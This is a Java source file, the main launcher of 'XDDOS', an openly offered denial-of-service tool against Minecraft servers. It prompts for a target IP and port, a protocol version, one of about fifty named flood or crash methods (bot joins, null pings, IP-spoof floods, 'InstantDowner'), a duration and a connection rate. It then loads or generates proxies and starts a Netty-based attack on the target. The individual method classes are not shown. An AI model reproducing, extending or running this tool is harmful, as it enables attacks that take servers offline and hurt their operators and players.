package XD.XDDOS;

import XD.XDDOS.methods.Method;
import XD.XDDOS.utils.ServerAddress;

import java.io.File;
import java.net.InetAddress;
import java.util.Random;
import java.util.Scanner;

public class Main {
   //all variables 
   // make a file selector in gui so they can input proxy file or if they dont use that it will use proxy gen to gen proxy @glonk0

   public static File proxyFile;
   public static String origIP;
   public static String srvRecord;
   public static InetAddress resolved;
   public static int port;
   public static int protcolID;
   public static int protocolLength;
   public static String methodID;
   public static Method method;
   public static int duration;
   public static int targetCPS;
   public static int nettyThreads;
   public static int loopThreads;
   public static String string;
   public static ProxyLoader proxies;

   public static final String RED_BOLD = "\033[1;31m";    // RED
   public static final String GREEN_BOLD = "\033[1;32m";  // GREEN
   public static final String PURPLE_BOLD = "\033[1;35m"; // PURPLE
   public static final String WHITE_BOLD = "\033[1;37m";  // WHITE
   public static final String RESET = "\033[0m";
   public static final String CYAN_BOLD = "\033[1;36m";   // CYAN_BOLD

   public static void main(String[] args) throws Throwable {
      System.out.println();
      System.out.println();
      System.out.println(WHITE_BOLD + "██╗  ██╗██████╗ ██████╗  ██████╗ ███████╗\n" +
              "╚██╗██╔╝██╔══██╗██╔══██╗██╔═══██╗██╔════╝\n" +
              " ╚███╔╝ ██║  ██║██║  ██║██║   ██║███████╗\n" +
              " ██╔██╗ ██║  ██║██║  ██║██║   ██║╚════██║\n" +
              "██╔╝ ██╗██████╔╝██████╔╝╚██████╔╝███████║\n" +
              "╚═╝  ╚═╝╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝\n" +
              "\n" + RED_BOLD +
              "MADE BY: " + WHITE_BOLD + "xD_Aeryz#7240\n" + WHITE_BOLD + "> " + PURPLE_BOLD +
              "DISCORD: " + GREEN_BOLD + "http://discord.io/XDDOS\n" + WHITE_BOLD + "> " + WHITE_BOLD +
              "Starting XDDOS :-\n" + RESET +
              "\n" + GREEN_BOLD +
              "STARTING\n" + RESET
      );
      Scanner in = new Scanner(System.in);

      int cpuselect;
      String serverhp;
      if (args.length != 6) {
         System.out.print("You server <IP:PORT>:\n>>");
         serverhp = in.nextLine();

         System.out.print("Server protocol (https://wiki.vg/Protocol_version_numbers):\n>>");
         protcolID = Integer.parseInt(in.nextLine());

         System.out.print("["+RED_BOLD+"Methods"+WHITE_BOLD+"]"+"\n\n"+WHITE_BOLD+
                 "[01]" + CYAN_BOLD + " BigHandshake\n" + WHITE_BOLD +
                 "[02]" + CYAN_BOLD + " Bigpacket\n" + WHITE_BOLD +
                 "[03]" + CYAN_BOLD + " Botjoiner\n" + WHITE_BOLD +
                 "[04]" + CYAN_BOLD + " ChatSpam\n" + WHITE_BOLD +
                 "[05]" + CYAN_BOLD + " ColorCrasher\n" + WHITE_BOLD +
                 "[06]" + CYAN_BOLD + " CPUDowner\n" + WHITE_BOLD +
                 "[07]" + CYAN_BOLD + " Doublejoin\n" + WHITE_BOLD +
                 "[08]" + CYAN_BOLD + " EmptyNames\n" + WHITE_BOLD +
                 "[09]" + CYAN_BOLD + " ExtremeJoin\n" + WHITE_BOLD +
                 "[10]" + CYAN_BOLD + " ExtremeKiller\n" + WHITE_BOLD +
                 "[11]" + CYAN_BOLD + " Handshake\n" + WHITE_BOLD +
                 "[12]" + CYAN_BOLD + " InstantDowner\n" + WHITE_BOLD +
                 "[13]" + CYAN_BOLD + " InvalidData\n" + WHITE_BOLD +
                 "[14]" + CYAN_BOLD + " InvalidNames\n" + WHITE_BOLD +
                 "[15]" + CYAN_BOLD + " InvalidSpoof\n" + WHITE_BOLD +
                 "[16]" + CYAN_BOLD + " IPSpoofFFlood\n" + WHITE_BOLD +
                 "[17]" + CYAN_BOLD + " Join\n" + WHITE_BOLD +
                 "[18]" + CYAN_BOLD + " LegacyPing\n" + WHITE_BOLD +
                 "[19]" + CYAN_BOLD + " LegitnameJoin\n" + WHITE_BOLD +
                 "[20]" + CYAN_BOLD + " LocalHost\n" + WHITE_BOLD +
                 "[21]" + CYAN_BOLD + " LongHost\n" + WHITE_BOLD +
                 "[22]" + CYAN_BOLD + " LongNames\n" + WHITE_BOLD +
                 "[23]" + CYAN_BOLD + " Memory\n" + WHITE_BOLD +
                 "[24]" + CYAN_BOLD + " MOTD\n" + WHITE_BOLD +
                 "[25]" + CYAN_BOLD + " NabCry\n" + WHITE_BOLD +
                 "[26]" + CYAN_BOLD + " NettyDowner\n" + WHITE_BOLD +
                 "[27]" + CYAN_BOLD + " Network\n" + WHITE_BOLD +
                 "[28]" + CYAN_BOLD + " NewNullPing\n" + WHITE_BOLD +
                 "[29]" + CYAN_BOLD + " NullPing\n" + WHITE_BOLD +
                 "[30]" + CYAN_BOLD + " Ping\n" + WHITE_BOLD +
                 "[31]" + CYAN_BOLD + " PingJoin\n" + WHITE_BOLD +
                 "[32]" + CYAN_BOLD + " Query\n" + WHITE_BOLD +
                 "[33]" + CYAN_BOLD + " Queue\n" + WHITE_BOLD +
                 "[34]" + CYAN_BOLD + " QuitExceptions\n" + WHITE_BOLD +
                 "[35]" + CYAN_BOLD + " Ram\n" + WHITE_BOLD +
                 "[36]" + CYAN_BOLD + " RandomExceptions\n" + WHITE_BOLD +
                 "[37]" + CYAN_BOLD + " RandomPacket\n" + WHITE_BOLD +
                 "[38]" + CYAN_BOLD + " SF\n" + WHITE_BOLD +
                 "[39]" + CYAN_BOLD + " Slapper\n" + WHITE_BOLD +
                 "[40]" + CYAN_BOLD + " SmartBot\n" + WHITE_BOLD +
                 "[41]" + CYAN_BOLD + " Spoof\n" + WHITE_BOLD +
                 "[42]" + CYAN_BOLD + " TcpBypass\n" + WHITE_BOLD +
                 "[43]" + CYAN_BOLD + " TcpHit\n" + WHITE_BOLD +
                 "[44]" + CYAN_BOLD + " UltimateKiller\n" + WHITE_BOLD +
                 "[45]" + CYAN_BOLD + " UltimateSmasher\n" + WHITE_BOLD +
                 "[46]" + CYAN_BOLD + " UnexpectedPacket\n" + WHITE_BOLD +
                 "[47]" + CYAN_BOLD + " WaterFallBypass\n" + WHITE_BOLD +
                 "[48]" + CYAN_BOLD + " XDjoin\n" + WHITE_BOLD +
                 "[49]" + CYAN_BOLD + " XDSpam\n" + WHITE_BOLD +
                 "[50]" + CYAN_BOLD + " YooniksCry\n\n"+WHITE_BOLD+
                 "["+RED_BOLD+"Experimental Methods"+WHITE_BOLD+"]"+"\n\n"+WHITE_BOLD+
                 "[01]" + CYAN_BOLD + " EmptyNames\n" + WHITE_BOLD +
                 "[02]" + CYAN_BOLD + " UUIDCrash\n" + WHITE_BOLD +
                 "[03]" + CYAN_BOLD + " BungeeDowner\n" + WHITE_BOLD +
                  "\n" +
                 WHITE_BOLD+ "[" + RED_BOLD + "INFO" +WHITE_BOLD+"] Default Method is \"NettyDowner\" and type full name of the Methods don't be LAZY\n"+WHITE_BOLD+"\n"+
                 "TYPE NAME OF METHOD:" + GREEN_BOLD +
                 "\n>>" + RESET);

         methodID = in.nextLine().toLowerCase();
         System.out.print("Time (secons):\n>>");
         duration = Integer.parseInt(in.nextLine());

         System.out.print("Target cps (-1 for max):\n>>");
         cpuselect = Integer.parseInt(in.nextLine());
         in.close();
      }  

      else {
         serverhp = args[0];
         protcolID = Integer.parseInt(args[1]);
         methodID = args[2].toLowerCase();
         duration = Integer.parseInt(args[3]);
         cpuselect = Integer.parseInt(args[4]);

      }
      

      if (args.length == 6) {
         String yorn = args[5];
         if (yorn.equalsIgnoreCase("y") || yorn.isEmpty()) {
            proxies = (new ProxyGen(new File("proxies.txt"), args)).load();
         }
         else if(yorn.equalsIgnoreCase("n")){
            proxyFile = new File("proxies.txt");
            proxies = new ProxyLoader(proxyFile);
         }
      }
      else {
         proxies = (new ProxyGen(new File("proxies.txt"), args)).load();
         }

         try {
            System.out.println("Resolving IP...");
            ServerAddress sa = ServerAddress.getAddrss(serverhp);
            srvRecord = sa.getIP();
            port = sa.getPort();
            resolved = InetAddress.getByName(srvRecord);
            System.out.println("Resolved IP: " + resolved.getHostAddress());
            origIP = serverhp.split(":")[0];
            targetCPS = cpuselect + (int) Math.ceil((double) cpuselect / 100 * (50 + (double) cpuselect / 5000));
            nettyThreads = targetCPS == -1 ? 256 : (int) Math.ceil(6.4E-4D * (double) targetCPS);
            loopThreads = targetCPS == -1 ? 3 : (int) Math.ceil(1.999960000799984E-5D * (double) targetCPS);
            protocolLength = protcolID > 128 ? 3 : 2;
            Random r = new Random();

            
            for (int i = 1; i < 65536; ++i) string = string + (char) (r.nextInt(125) + 1);

         } catch (Exception var4) {
            var4.printStackTrace();
            Thread.sleep(5000L);
            return;
         }

         Methods.setupMethods();
         method = Methods.getMethod(methodID);
      System.out.println("Running method: " + method);
      NettyBootstrap.start();
      }


   }
